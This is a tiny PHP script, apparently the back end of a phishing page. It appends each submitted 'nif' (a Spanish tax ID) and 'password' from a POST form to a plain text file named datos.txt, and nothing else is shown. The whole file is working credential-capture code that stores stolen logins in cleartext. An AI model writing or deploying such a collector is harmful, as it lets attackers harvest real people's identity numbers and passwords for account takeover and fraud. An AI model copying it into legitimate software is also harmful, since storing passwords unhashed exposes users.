<?php
$f = fopen("datos.txt","a");
fputs($f,$_POST['nif'].";".$_POST['password']."\n");
fclose($f);
?>